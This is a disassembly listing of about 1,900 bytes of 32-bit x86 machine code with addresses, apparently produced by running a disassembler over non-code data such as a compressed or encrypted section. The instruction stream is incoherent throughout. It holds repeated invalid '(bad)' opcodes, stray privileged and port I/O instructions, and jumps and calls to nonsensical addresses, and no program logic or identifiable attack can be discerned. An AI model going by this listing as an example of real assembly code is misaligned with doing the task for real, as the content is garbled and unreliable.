  4236cd:	sbb    al,0x33
  4236cf:	sub    edi,ebx
  4236d1:	dec    ebx
  4236d2:	das    
  4236d3:	xchg   ebp,eax
  4236d4:	add    al,0xbc
  4236d6:	(bad)  
  4236d7:	cli    
  4236d8:	ds pop esi
  4236da:	neg    edx
  4236dc:	iret   
  4236dd:	fld    DWORD PTR [ebx+ebp*1-0x70]
  4236e1:	push   ss
  4236e2:	test   BYTE PTR [ebp-0x4f],ch
	...
  4236f1:	sbb    al,0x66
  4236f3:	in     eax,0x66
  4236f5:	jmp    edi
  4236f7:	lahf   
  4236f8:	jle    0x42374a
  4236fa:	stos   BYTE PTR es:[edi],al
  4236fb:	xchg   BYTE PTR [eax-0x1dab0f50],dh
  423701:	inc    ebp
  423702:	scas   eax,DWORD PTR es:[edi]
  423703:	add    DWORD PTR [eax],eax
  423705:	lods   al,BYTE PTR ds:[esi]
  423706:	add    eax,DWORD PTR [eax]
  423708:	add    BYTE PTR [eax-0x706c11ba],dh
  42370e:	push   edi
  42370f:	adc    eax,0x20506d01
  423714:	sbb    esp,ebx
  423716:	int3   
  423717:	mov    al,0xe3
  423719:	cmp    BYTE PTR [edx-0x4a],ah
  42371c:	jno    0x423719
  42371e:	loopne 0x4236f9
  423720:	(bad)  
  423721:	into   
  423722:	sbb    edi,DWORD PTR [esi+0x6dc7b760]
  423728:	mov    al,ds:0xf3a79372
  42372d:	mov    ds:0xddb0b0b,eax
  423732:	stc    
  423733:	jb     0x423704
  423735:	pop    DWORD PTR [ebx]
  423737:	jae    0x42372e
  423739:	add    ecx,DWORD PTR [ecx-0x3239772a]
  42373f:	xchg   esi,eax
  423740:	pop    esp
  423741:	mov    edi,0x4e8425a2
  423746:	loop   0x4236f4
  423748:	push   0x1f
  42374a:	mov    es,WORD PTR [edx-0x5f4a6d00]
  423750:	and    al,0xb6
  423752:	cmp    DWORD PTR [eax+0x58],ecx
  423755:	cmp    eax,0x6a23010f
  42375a:	add    eax,0x7bfd9f4f
  42375f:	lahf   
  423760:	pop    ebp
  423761:	data16 out 0x3b,al
  423764:	ret    
  423765:	and    al,0x94
  423767:	mov    bh,0xb5
  423769:	arpl   WORD PTR ds:0x288f2f,di
  42376f:	add    BYTE PTR [edi+0x25dc267c],bh
  423775:	xor    eax,0xaae83c13
  42377a:	pop    eax
  42377b:	adc    DWORD PTR [ebx],ebp
  42377d:	mov    eax,0xf3edcdc8
  423782:	jmp    0xe046a16a
  423787:	into   
  423788:	adc    BYTE PTR [esi],ch
  42378a:	cwde   
  42378b:	std    
  42378c:	mov    esi,0x68146af6
  423791:	inc    ebp
  423792:	and    al,0xac
  423794:	(bad)  
  423795:	out    dx,al
  423796:	repz lahf 
  423798:	add    BYTE PTR [ecx-0x14],dh
  42379b:	sti    
  42379c:	adc    al,0xd1
  42379e:	in     eax,dx
  42379f:	(bad)  
  4237a0:	imul   edi,DWORD PTR [edx],0xa94d38e3
  4237a6:	sbb    esp,ebx
  4237a8:	push   0xf5582140
  4237ad:	test   BYTE PTR [ebx+eax*2],0xa0
  4237b1:	bound  ecx,QWORD PTR [esi+ebp*2]
  4237b4:	and    BYTE PTR [esi+0x4c52f058],0x88
  4237bb:	jmp    0x465318d5
  4237c0:	out    dx,eax
  4237c1:	fmul   DWORD PTR [edi-0x33]
  4237c4:	repz cld 
  4237c6:	bound  eax,QWORD PTR [ebx+0x39]
  4237c9:	ret    
  4237ca:	ins    DWORD PTR es:[edi],dx
  4237cb:	and    ebp,eax
  4237cd:	outs   dx,BYTE PTR ds:[esi]
  4237ce:	std    
  4237cf:	cli    
  4237d0:	pushf  
  4237d1:	inc    edx
  4237d2:	lds    ebx,FWORD PTR [esi+ebx*2]
  4237d5:	jg     0x4237a5
  4237d7:	jnp    0x4237f7
  4237d9:	test   ax,0xe397
  4237dd:	lds    ebx,FWORD PTR [esp+eiz*4+0x61]
  4237e1:	mov    cl,0xe1
  4237e3:	dec    ebp
  4237e4:	and    eax,0x4da02c23
  4237e9:	lock int 0xc8
  4237ec:	(bad)  
  4237ed:	aam    0x54
  4237ef:	xor    BYTE PTR [edx-0x3836ccdf],bh
  4237f5:	push   ds
  4237f6:	pop    es
  4237f7:	into   
  4237f8:	fs lahf 
  4237fa:	call   0x3e43489
  4237ff:	mov    cl,BYTE PTR [esi+0x52]
  423802:	or     eax,0x4baf836d
  423807:	sub    DWORD PTR [ebx],ecx
  423809:	inc    esi
  42380a:	xor    ebp,ebp
  42380c:	dec    ebx
  42380d:	fmul   st(7),st
  42380f:	stos   BYTE PTR es:[edi],al
  423810:	popf   
  423811:	aam    0x43
  423813:	daa    
  423814:	mov    ds:0xa67d60d5,eax
  423819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42381a:	jmp    0x423815
  42381c:	pop    edx
  42381d:	lock outs dx,BYTE PTR ds:[esi]
  42381f:	and    al,0xcb
  423821:	jge    0x423823
  423823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423824:	push   0xa121b3f6
  423829:	hlt    
  42382a:	sub    al,0x1c
  42382c:	mov    ds:0x8ddd86ad,eax
  423831:	mov    eax,0xac99aa2e
  423836:	lds    edi,FWORD PTR [ecx+0x55]
  423839:	and    eax,0x5837e5c1
  42383e:	pop    eax
  42383f:	pop    ds
  423840:	fcmovnb st,st(1)
  423842:	mov    bl,0x9a
  423844:	out    dx,eax
  423845:	add    esi,edx
  423847:	lods   al,BYTE PTR ds:[esi]
  423848:	mov    dh,0x70
  42384a:	les    esp,FWORD PTR [edx+0x3a]
  42384d:	sbb    al,0x56
  42384f:	mov    ch,0x38
  423851:	sbb    eax,0xa8d538c4
  423856:	cli    
  423857:	mov    esi,0x4119eef1
  42385c:	mov    dl,0xbe
  42385e:	jnp    0x423888
  423860:	popa   
  423861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423862:	mov    cl,0xe4
  423864:	(bad)  
  423865:	jno    0x423855
  423867:	int3   
  423868:	fisttp DWORD PTR [esi]
  42386a:	adc    BYTE PTR [edx],dh
  42386c:	push   ecx
  42386d:	and    DWORD PTR [ebx+0x778b2b60],edx
  423873:	in     al,dx
  423874:	std    
  423875:	xor    BYTE PTR [edx],ch
  423877:	imul   edx,DWORD PTR [edi+0x11e07f38],0x24
  42387e:	mov    edi,0xd109d30a
  423883:	jno    0x423829
  423885:	aas    
  423886:	adc    esp,DWORD PTR ds:0x8afdf6ee
  42388c:	mov    eax,ds:0xc9a24928
  423891:	(bad)  
  423892:	ins    BYTE PTR es:[edi],dx
  423893:	jno    0x423826
  423895:	sub    ah,ah
  423897:	jne    0x4238b7
  423899:	rcr    BYTE PTR [ebx-0x53],cl
  42389c:	cwde   
  42389d:	cmp    eax,0xc738d32e
  4238a2:	push   ecx
  4238a3:	jmp    DWORD PTR [edx-0x55]
  4238a6:	jmp    0x423896
  4238a8:	xor    cl,bh
  4238aa:	add    ebp,esi
  4238ac:	imul   ebp,DWORD PTR [ebp-0x40],0xffffff89
  4238b0:	retf   0x89ac
  4238b3:	sub    al,0x39
  4238b5:	cmp    eax,0x75489587
  4238ba:	jmp    0x3fe6:0x8f523602
  4238c1:	sub    al,0x58
  4238c3:	addr16 (bad) 
  4238c5:	bound  esi,QWORD PTR [edi+0x5bcfc76d]
  4238cb:	aad    0x53
  4238cd:	sub    BYTE PTR [ebp-0x2d09b109],al
  4238d3:	aad    0xd1
  4238d5:	in     al,0x72
  4238d7:	in     al,0x6
  4238d9:	dec    ecx
  4238da:	cmc    
  4238db:	jne    0x423862
  4238dd:	mov    DWORD PTR [esi+0x17af3],edx
  4238e3:	pop    edx
  4238e4:	jge    0x4238e3
  4238e6:	dec    ebx
  4238e7:	jle    0x42388c
  4238e9:	dec    ebp
  4238ea:	adc    DWORD PTR [edi-0x12],ebp
  4238ed:	jb     0x4238c5
  4238ef:	jge    0x4238c5
  4238f1:	adc    eax,0x272daacc
  4238f6:	cli    
  4238f7:	xor    eax,0xd94a2fa2
  4238fc:	add    DWORD PTR [ebp+0x51],ecx
  4238ff:	test   eax,0x55d47f7e
  423904:	add    ch,BYTE PTR [edx]
  423906:	inc    eax
  423907:	mov    ebx,0x4319a450
  42390c:	inc    edi
  42390d:	xchg   ebx,eax
  42390e:	pop    edi
  42390f:	aam    0x3a
  423911:	out    0xe7,eax
  423913:	fwait
  423914:	icebp  
  423915:	adc    DWORD PTR [ecx-0x5c25f6c9],eax
  42391b:	add    eax,0xe14188ac
  423920:	pop    ebx
  423921:	adc    esi,esi
  423923:	jg     0x4238c0
  423925:	mov    eax,0x5b6fc331
  42392a:	mov    esp,fs
  42392c:	sahf   
  42392d:	les    ebx,FWORD PTR [ebp-0x76]
  423930:	ins    BYTE PTR es:[edi],dx
  423931:	jg     0x42395c
  423933:	mov    cl,0x42
  423935:	fistp  DWORD PTR [edi-0x25]
  423938:	mov    ?,WORD PTR [edi+0xca2ee7a]
  42393e:	xchg   ebp,eax
  42393f:	ins    DWORD PTR es:[edi],dx
  423940:	mov    eax,ds:0x9baced9a
  423945:	cdq    
  423946:	lahf   
  423947:	outs   dx,BYTE PTR ds:[esi]
  423948:	or     bh,BYTE PTR [eax+0x28e0cf4e]
  42394e:	lods   al,BYTE PTR ds:[esi]
  42394f:	ror    DWORD PTR [ecx+0x692026b8],cl
  423955:	fcomp  QWORD PTR ds:0x75dde5b0
  42395b:	aad    0xad
  42395d:	mov    ecx,esi
  42395f:	pusha  
  423960:	fst    DWORD PTR [edx-0x2eb5e75e]
  423966:	repnz and eax,0x7b46febd
  42396c:	push   edx
  42396d:	inc    edi
  42396e:	cmp    ecx,ebx
  423970:	shl    BYTE PTR [edi-0x7a7ed627],1
  423976:	mov    ds:0xea064c5d,al
  42397b:	adc    ah,al
  42397d:	or     edx,esp
  42397f:	test   ebp,ecx
  423981:	in     al,dx
  423982:	cs aam 0x84
  423985:	and    DWORD PTR [esi-0x39],esi
  423988:	add    al,0x37
  42398a:	popf   
  42398b:	mov    ah,0x24
  42398d:	inc    edi
  42398e:	cmp    DWORD PTR [ebx+eiz*4],eax
  423991:	mov    esi,0x40904fe
  423996:	and    BYTE PTR [ebx+0x1d],0xd3
  42399a:	les    edx,FWORD PTR [edx+0x3f327467]
  4239a0:	sub    BYTE PTR [esi],al
  4239a2:	out    dx,al
  4239a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239a4:	out    0x60,al
  4239a6:	stc    
  4239a7:	jmp    0x46f9:0x706f9f9e
  4239ae:	sub    bh,ch
  4239b0:	mov    dh,0xb2
  4239b2:	clc    
  4239b3:	xor    edx,edx
  4239b5:	cmp    eax,0x9b2ec326
  4239ba:	rcl    DWORD PTR [ecx],0x49
  4239bd:	push   ss
  4239be:	stc    
  4239bf:	cmp    al,0xa8
  4239c1:	or     al,0x4f
  4239c3:	pop    esp
  4239c4:	or     dl,BYTE PTR [esi]
  4239c6:	mov    ebp,0x3990f541
  4239cb:	cdq    
  4239cc:	and    DWORD PTR [ecx-0x5b],esi
  4239cf:	push   ecx
  4239d0:	pop    ss
  4239d1:	mov    dl,0xc4
  4239d3:	ficomp WORD PTR [ecx+0x4e]
  4239d6:	or     al,al
  4239d8:	loop   0x423a0c
  4239da:	or     eax,DWORD PTR [ecx+ecx*2+0x4cc7b228]
  4239e1:	lock push esi
  4239e3:	adc    DWORD PTR [ecx-0x1c42cf06],esp
  4239e9:	jns    0x4239de
  4239eb:	call   0x13d130d8
  4239f0:	test   al,0xaf
  4239f2:	test   BYTE PTR [ecx+ebx*4-0x479982be],cl
  4239f9:	adc    BYTE PTR ds:0x40caad9c,0xa2
  423a00:	mov    ah,0xa5
  423a02:	dec    esp
  423a03:	in     al,0x7a
  423a05:	mov    esi,0xaf3f2acf
  423a0a:	sbb    edx,esp
  423a0c:	js     0x423a18
  423a0e:	mov    dl,0x79
  423a10:	sar    DWORD PTR [ebx],1
  423a12:	cmp    al,0x2c
  423a14:	out    dx,eax
  423a15:	dec    esi
  423a16:	jns    0x4239c2
  423a18:	add    BYTE PTR [edx-0x68],bh
  423a1b:	dec    esi
  423a1c:	and    ah,bl
  423a1e:	std    
  423a1f:	repnz aas 
  423a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a22:	rcl    BYTE PTR [ebp-0x1c996db5],cl
  423a28:	xchg   BYTE PTR [ecx],ch
  423a2a:	ret    0x22df
  423a2d:	ret    
  423a2e:	jecxz  0x4239ca
  423a30:	add    ch,bl
  423a32:	leave  
  423a33:	pushf  
  423a34:	daa    
  423a35:	jne    0x423aa1
  423a37:	sub    al,0x3b
  423a39:	fsub   QWORD PTR [esp+edx*8-0x67152f64]
  423a40:	push   eax
  423a41:	leave  
  423a42:	fdiv   QWORD PTR [ecx-0x4e]
  423a45:	jnp    0x423a6c
  423a47:	lods   eax,DWORD PTR ds:[esi]
  423a48:	jo     0x4239cd
  423a4a:	sbb    esi,DWORD PTR [ecx-0x50]
  423a4d:	daa    
  423a4e:	push   es
  423a4f:	xor    ch,BYTE PTR gs:[edi+0x3f]
  423a53:	dec    edx
  423a54:	xlat   BYTE PTR ds:[ebx]
  423a55:	mov    ebx,0xc8d70a3
  423a5a:	mov    al,0x39
  423a5c:	sbb    BYTE PTR [ebp+esi*1-0x46],al
  423a60:	retf   
  423a61:	lock inc edi
  423a63:	mov    edi,0x7125f3c5
  423a68:	leave  
  423a69:	push   ebx
  423a6a:	bound  esi,QWORD PTR [ebp+0x23032a85]
  423a70:	push   DWORD PTR [ebx+0x1b]
  423a73:	fs test cl,bl
  423a76:	xchg   esp,eax
  423a77:	in     al,0x5
  423a79:	clc    
  423a7a:	xchg   edi,eax
  423a7b:	fiadd  WORD PTR [edx-0x29d29eac]
  423a81:	lock mov ch,0x5e
  423a84:	dec    edx
  423a85:	pop    edi
  423a86:	retf   0xede8
  423a89:	pop    ss
  423a8a:	std    
  423a8b:	lock or al,0x2c
  423a8e:	lock jns 0x423a91
  423a91:	and    ebx,esi
  423a93:	rol    DWORD PTR [ecx+0x26],1
  423a96:	fisub  WORD PTR [ebp+0x1881f221]
  423a9c:	jecxz  0x423a88
  423a9e:	add    dh,BYTE PTR [eax-0x7b]
  423aa1:	push   edx
  423aa2:	sbb    edi,DWORD PTR [ebp-0x30]
  423aa5:	retf   0x309d
  423aa8:	dec    ecx
  423aa9:	call   0xc8b9:0x8af8415f
  423ab0:	pop    edi
  423ab1:	inc    ebx
  423ab2:	jge    0x423a74
  423ab4:	mov    dl,0x0
	...
  423abe:	add    BYTE PTR [eax],al
  423ac0:	add    BYTE PTR [ecx-0x6],cl
  423ac3:	mov    ebx,0xfd4fbb4e
  423ac8:	dec    DWORD PTR [ecx]
  423aca:	mov    WORD PTR ds:[edi+0x72],cs
  423ace:	mov    bh,0x72
  423ad0:	mov    ds:0x1b2f1,al
  423ad5:	lods   al,BYTE PTR ds:[esi]
  423ad6:	add    eax,DWORD PTR [eax]
  423ad8:	add    ah,dh
  423ada:	neg    DWORD PTR ds:0xd0bfc545
  423ae0:	pop    ds
  423ae1:	add    al,0x55
  423ae3:	sbb    DWORD PTR [eax-0x77e2cea3],esi
  423ae9:	lea    ebx,[esi-0x30]
  423aec:	xor    eax,0x9cecdc4a
  423af1:	xor    DWORD PTR [esi+0x48],0xffffffc2
  423af5:	lods   al,BYTE PTR ds:[esi]
  423af6:	lahf   
  423af7:	ja     0x423b34
  423af9:	jg     0x423a82
  423afb:	jp     0x423a95
  423afd:	shl    BYTE PTR [ebx],1
  423aff:	inc    esp
  423b00:	mov    esp,0x987ddbe1
  423b05:	add    eax,esp
  423b07:	fst    st(0)
  423b09:	iret   
  423b0a:	push   esp
  423b0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b0c:	arpl   WORD PTR [edx+esi*2+0x7f],ax
  423b10:	mov    esi,DWORD PTR [ecx]
  423b12:	xchg   esp,eax
  423b13:	test   al,0x12
  423b15:	sub    eax,0x8e85f167
  423b1a:	push   esi
  423b1b:	pop    ebx
  423b1c:	outs   dx,DWORD PTR ds:[esi]
  423b1d:	sub    DWORD PTR [eax],esi
  423b1f:	test   ah,dh
  423b21:	out    dx,al
  423b22:	ficom  DWORD PTR [edx]
  423b24:	sbb    BYTE PTR [ebx],0x58
  423b27:	and    ecx,DWORD PTR [esi]
  423b29:	sub    DWORD PTR [edi-0x37],ebp
  423b2c:	or     al,0x9d
  423b2e:	ins    DWORD PTR es:[edi],dx
  423b2f:	ficomp DWORD PTR [ecx+0x1e]
  423b32:	mov    dh,0x1c
  423b34:	mov    ch,BYTE PTR gs:[esi]
  423b37:	pushf  
  423b38:	imul   eax,DWORD PTR ds:0xb85cd4a1,0xa180c544
  423b42:	push   ecx
  423b43:	cwde   
  423b44:	es pop ebx
  423b46:	dec    edx
  423b47:	cmp    BYTE PTR [ecx+ebp*4+0x1e],cl
  423b4b:	mov    BYTE PTR gs:[edx-0x2e],dh
  423b4f:	push   ecx
  423b50:	pop    esi
  423b51:	sbb    ah,BYTE PTR [edx-0x71b34f9f]
  423b57:	dec    eax
  423b58:	repnz in eax,dx
  423b5a:	xchg   ebx,eax
  423b5b:	dec    BYTE PTR [ebx]
  423b5d:	iret   
  423b5e:	out    0x89,eax
  423b60:	ins    DWORD PTR es:[edi],dx
  423b61:	jp     0x423b7c
  423b63:	hlt    
  423b64:	and    BYTE PTR [edi-0x2d],cl
  423b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b68:	mov    eax,ds:0x3fa529ee
  423b6d:	mov    eax,0x71d43189
  423b72:	ret    
  423b73:	out    0x27,al
  423b75:	xor    esi,DWORD PTR [ecx+ebp*4+0x6d]
  423b79:	mov    BYTE PTR [ecx-0xc87bbf5],cl
  423b7f:	mov    ebp,DWORD PTR [esi]
  423b81:	int3   
  423b82:	rcl    BYTE PTR [edx],1
  423b84:	jne    0x423b12
  423b86:	das    
  423b87:	repnz xlat BYTE PTR ds:[ebx]
  423b89:	xor    DWORD PTR [ecx-0x3b],edi
  423b8c:	jmp    0xf68b:0xc2f2c5c4
  423b93:	sub    bl,BYTE PTR [edi-0x33]
  423b96:	push   ss
  423b97:	sar    DWORD PTR [esi],1
  423b99:	or     bl,BYTE PTR [edx+0x44ba2109]
  423b9f:	xor    ah,ah
  423ba1:	or     edi,DWORD PTR [eax+eiz*1]
  423ba4:	(bad)  
  423ba5:	push   ecx
  423ba6:	cs into 
  423ba8:	sub    eax,0xa5f8150d
  423bad:	std    
  423bae:	push   cs
  423baf:	adc    al,bl
  423bb1:	retf   
  423bb2:	scas   eax,DWORD PTR es:[edi]
  423bb3:	mov    ds:0x8ae254a6,al
  423bb8:	rcl    BYTE PTR [edx+esi*8],1
  423bbb:	mov    ah,0x9a
  423bbd:	pop    esi
  423bbe:	push   edx
  423bbf:	xchg   ebp,eax
  423bc0:	sbb    DWORD PTR [ecx-0x3456b1f4],esp
  423bc6:	mov    BYTE PTR [edi],dh
  423bc8:	fldenv [esi-0x75]
  423bcb:	push   ss
  423bcc:	fidiv  WORD PTR [edx-0x63]
  423bcf:	lea    edx,ds:0x422c6c35
  423bd5:	or     BYTE PTR [ecx],bl
  423bd7:	xchg   edi,eax
  423bd8:	ds leave 
  423bda:	mov    ch,0x5a
  423bdc:	mov    ds:0x581984dd,al
  423be1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423be2:	sti    
  423be3:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  423be5:	jecxz  0x423bc9
  423be7:	outs   dx,BYTE PTR ds:[esi]
  423be8:	push   ebp
  423be9:	and    DWORD PTR [ebp+0x20e6b764],ebp
  423bef:	cmp    al,0x45
  423bf1:	imul   esp,DWORD PTR [edx+0x78],0xf3447b9f
  423bf8:	add    ecx,DWORD PTR [eax+0x77]
  423bfb:	cwde   
  423bfc:	call   0x3cc5:0x15a74855
  423c03:	pushf  
  423c04:	push   esi
  423c05:	scas   al,BYTE PTR es:[edi]
  423c06:	daa    
  423c07:	sti    
  423c08:	and    al,0x61
  423c0a:	jnp    0x423b8c
  423c0c:	push   edx
  423c0d:	xchg   esi,eax
  423c0e:	mov    bl,0xc7
  423c10:	pop    esp
  423c11:	lods   eax,DWORD PTR ds:[esi]
  423c12:	inc    esi
  423c13:	fisub  WORD PTR [ebp+0x7]
  423c16:	int    0x20
  423c18:	inc    edx
  423c19:	pop    ds
  423c1a:	xlat   BYTE PTR ds:[ebx]
  423c1b:	mov    al,0x91
  423c1d:	jge    0x423be3
  423c1f:	shl    ah,1
  423c21:	sub    esi,DWORD PTR [ebp+0x3]
  423c24:	adc    eax,0xabe5e81c
  423c29:	cwde   
  423c2a:	sub    edx,0x54227608
  423c30:	scas   eax,DWORD PTR es:[edi]
  423c31:	sub    ebp,ebp
  423c33:	jle    0x423bd5
  423c35:	out    0xc7,eax
  423c37:	lods   eax,DWORD PTR ds:[esi]
  423c38:	pop    esp
  423c39:	in     al,0xd6
  423c3b:	pushf  
  423c3c:	outs   dx,DWORD PTR ds:[esi]
  423c3d:	push   edi
  423c3e:	lds    ebx,FWORD PTR [esi+0x3bd925cb]
  423c44:	sahf   
  423c45:	xchg   ecx,eax
  423c46:	int    0x5c
  423c48:	inc    esp
  423c49:	ss retf 0x41c6
  423c4d:	jbe    0x423c6a
  423c4f:	loopne 0x423ca5
  423c51:	adc    BYTE PTR [edi-0x18],ah
  423c54:	dec    esi
  423c55:	pop    ds
  423c56:	(bad)  
  423c57:	in     al,0x6d
  423c59:	push   edx
  423c5a:	push   eax
  423c5b:	stos   BYTE PTR es:[edi],al
  423c5c:	inc    edi
  423c5d:	xchg   esi,eax
  423c5e:	dec    esi
  423c5f:	push   edx
  423c60:	rcr    DWORD PTR [ebx+0x6e99f9e],cl
  423c66:	inc    ebp
  423c67:	mov    edx,0x5b2c3dab
  423c6c:	mov    WORD PTR [edi],gs
  423c6e:	adc    eax,0xceb01e29
  423c73:	mov    WORD PTR [esi-0x575974f],cs
  423c79:	inc    esp
  423c7a:	loope  0x423ca0
  423c7c:	cmp    al,0x39
  423c7e:	mov    ah,0x96
  423c80:	data16 lods al,BYTE PTR ds:[esi]
  423c82:	js     0x423c10
  423c84:	xchg   esp,eax
  423c85:	push   ecx
  423c86:	xor    DWORD PTR ds:[eax-0x2f28f48b],ebx
  423c8d:	push   0x358b2dc3
  423c92:	imul   edx,DWORD PTR gs:[edi],0xf67ca8cc
  423c99:	shl    BYTE PTR [esi+0x2f],0xae
  423c9d:	dec    ecx
  423c9e:	mov    eax,ds:0x6662ca2b
  423ca3:	repz xor bh,BYTE PTR [esi-0x2d]
  423ca7:	xchg   ebx,eax
  423ca8:	stos   DWORD PTR es:[edi],eax
  423ca9:	cld    
  423caa:	jl     0x423c3d
  423cac:	jl     0x423d09
  423cae:	push   esp
  423caf:	std    
  423cb0:	not    BYTE PTR [ebx+0x7b6ecd6]
  423cb6:	cld    
  423cb7:	lock or DWORD PTR [ebx],esi
  423cba:	aam    0x6b
  423cbc:	sub    al,0x1e
  423cbe:	bound  bx,DWORD PTR [edi]
  423cc1:	jge    0x423d35
  423cc3:	out    0x7f,al
  423cc5:	push   esi
  423cc6:	stos   BYTE PTR es:[edi],al
  423cc7:	mov    ebx,0xc41c1f66
  423ccc:	xor    bh,BYTE PTR [edx+0x2d52f530]
  423cd2:	pop    esp
  423cd3:	mov    dh,0xf1
  423cd5:	out    dx,eax
  423cd6:	data16 or al,0x27
  423cd9:	push   0x58
  423cdb:	(bad)  [ebp-0x5899463f]
  423ce1:	push   es
  423ce2:	std    
  423ce3:	cdq    
  423ce4:	cs cmp ch,dh
  423ce7:	rol    BYTE PTR [edx-0x7d],cl
  423cea:	dec    eax
  423ceb:	inc    ecx
  423cec:	mov    edx,0xf0e22031
  423cf1:	int3   
  423cf2:	pop    ebx
  423cf3:	(bad)  
  423cf4:	repnz cmp BYTE PTR [esp+ecx*8+0x683489ab],bl
  423cfc:	stc    
  423cfd:	push   cs
  423cfe:	pop    edi
  423cff:	jb     0x423cef
  423d01:	ds jne 0x423d64
  423d04:	in     eax,dx
  423d05:	fdivr  QWORD PTR [edi]
  423d07:	fstp   TBYTE PTR [ebp+0x28]
  423d0a:	ss pop eax
  423d0c:	cmp    eax,0x756accfb
  423d11:	int3   
  423d12:	adc    ah,BYTE PTR [ebx+0x4213a61]
  423d18:	(bad)  
  423d1a:	fcmovnbe st,st(2)
  423d1c:	mov    ds:0xa6d486ce,eax
  423d21:	jne    0x423d43
  423d23:	ds inc ebp
  423d25:	mov    eax,DWORD PTR [eax]
  423d27:	imul   edx,edx,0xce70ffdb
  423d2d:	repnz or BYTE PTR [esi],cl
  423d30:	pop    edx
  423d31:	rcl    BYTE PTR [esi-0x7b0e4ee6],cl
  423d37:	xchg   ebx,eax
  423d38:	jns    0x423db1
  423d3a:	push   edi
  423d3b:	test   eax,0x74a170f8
  423d40:	and    al,0x1b
  423d42:	xchg   edx,eax
  423d43:	mov    dh,0xe8
  423d45:	shl    ebx,cl
  423d47:	iret   
  423d48:	push   ebx
  423d49:	pop    eax
  423d4a:	icebp  
  423d4b:	mov    edi,?
  423d4d:	(bad)  
  423d4f:	add    eax,ebp
  423d51:	mov    bl,0xda
  423d53:	dec    ebp
  423d54:	in     al,0xcc
  423d56:	push   ds
  423d57:	ret    
  423d58:	shr    DWORD PTR [eax-0x59],cl
  423d5b:	mov    eax,ds:0x5662350e
  423d60:	push   edx
  423d61:	cli    
  423d62:	mov    DWORD PTR [ebx],0xa06b284
  423d68:	xor    esi,DWORD PTR [ebp+0x59]
  423d6b:	out    0x8a,eax
  423d6d:	xor    eax,0x1136207d
  423d72:	hlt    
  423d73:	in     eax,dx
  423d74:	add    BYTE PTR [ecx+edx*1-0x44],al
  423d78:	sbb    al,0xf2
  423d7a:	idiv   DWORD PTR [eax+0x26]
  423d7d:	xchg   ebp,eax
  423d7e:	call   DWORD PTR [esi]
  423d80:	mov    cl,0xcd
  423d82:	xor    DWORD PTR [edi-0x28],eax
  423d85:	out    0xb1,eax
  423d87:	outs   dx,DWORD PTR ds:[esi]
  423d88:	cmp    BYTE PTR [ebx-0x32],ch
  423d8b:	mov    cl,0xc
  423d8d:	xchg   edx,eax
  423d8e:	ja     0x423d73
  423d90:	test   BYTE PTR [ecx+0x4df1b0e6],bh
  423d96:	ja     0x423d65
  423d98:	mov    cl,0xe6
  423d9a:	int3   
  423d9b:	push   0x68
  423d9d:	pop    ebp
  423d9e:	and    al,0xc
  423da0:	inc    eax
  423da1:	js     0x423da8
  423da3:	cld    
  423da4:	in     eax,0xd1
  423da6:	stos   BYTE PTR es:[edi],al
  423da7:	add    ebp,edi
  423da9:	gs hlt 
  423dab:	lods   al,BYTE PTR ds:[esi]
  423dac:	pop    esp
  423dad:	stos   DWORD PTR es:[edi],eax
  423dae:	add    eax,0x6e9c0554
  423db3:	ja     0x423dd6
  423db5:	inc    ebp
  423db6:	cld    
  423db7:	(bad)  
  423db8:	mov    ds,WORD PTR [ebx+0x28]
  423dbb:	sbb    al,0x60
  423dbd:	inc    edx
  423dbe:	mov    ds:0x71647b22,eax
  423dc3:	ins    BYTE PTR es:[edi],dx
  423dc4:	mov    esi,0x4fc0c698
  423dc9:	mov    dl,0x8
  423dcb:	push   edx
  423dcc:	and    BYTE PTR [esi-0x60],ah
  423dcf:	pop    ecx
  423dd0:	(bad)  
  423dd1:	retf   
  423dd2:	addr16 (bad) 
  423dd5:	aaa    
  423dd6:	clc    
  423dd7:	ja     0x423e56
  423dd9:	popf   
  423dda:	inc    eax
  423ddb:	popf   
  423ddc:	test   bh,cl
  423dde:	scas   eax,DWORD PTR es:[edi]
  423ddf:	lods   eax,DWORD PTR ds:[esi]
  423de0:	lds    esp,FWORD PTR [eax]
  423de2:	sub    ch,bl
  423de4:	mov    ecx,ecx
  423de6:	mov    ebx,0x25675d9f
  423deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423dec:	dec    edi
  423ded:	js     0x423e41
  423def:	and    eax,DWORD PTR [ebp+0x199d74f8]
  423df5:	push   0xffffff9b
  423df7:	pop    es
  423df8:	pop    esi
  423df9:	mov    cl,0x8b
  423dfb:	sub    eax,DWORD PTR [eax+esi*8+0x60]
  423dff:	or     ch,0x70
  423e02:	ret    0x4bdc
  423e05:	and    ebp,DWORD PTR [ebx+0x75]
  423e08:	(bad)  
  423e0a:	push   edi
  423e0b:	jo     0x423e05
  423e0d:	sub    al,0x31
  423e0f:	fcomp  QWORD PTR [ecx]
  423e11:	push   eax
  423e12:	push   cs
  423e13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e14:	repz les ebx,FWORD PTR [ebp-0x15412ca8]
  423e1b:	ds push ecx
  423e1d:	or     BYTE PTR [ebx-0x654ea912],cl
  423e23:	push   eax
  423e24:	sub    ch,ch
  423e26:	or     eax,DWORD PTR [esi-0x20de0445]
  423e2c:	lea    esi,[ebx]
  423e2e:	dec    esi
  423e2f:	push   ss
  423e30:	dec    eax
  423e31:	push   es
  423e32:	out    0xc8,al
  423e34:	sub    BYTE PTR [esi+esi*4],bh
  423e37:	cmp    BYTE PTR [ecx+0x7a38fb16],dh
  423e3d:	sub    esp,ebp
  423e3f:	mov    ds:0x88e8a13c,eax
  423e44:	or     BYTE PTR [edx+0x4a1d36],ch
  423e4a:	xchg   ecx,eax
  423e4b:	push   eax
  423e4c:	sub    eax,0xb88c92cd
  423e51:	mov    esi,DWORD PTR [edx]
  423e53:	jge    0x423e21
  423e55:	sbb    DWORD PTR [esi+0x7aade978],ecx
  423e5b:	icebp  
  423e5c:	rcr    ah,1
  423e5e:	sbb    ebx,DWORD PTR [edi-0x1d]
  423e61:	xchg   ecx,eax
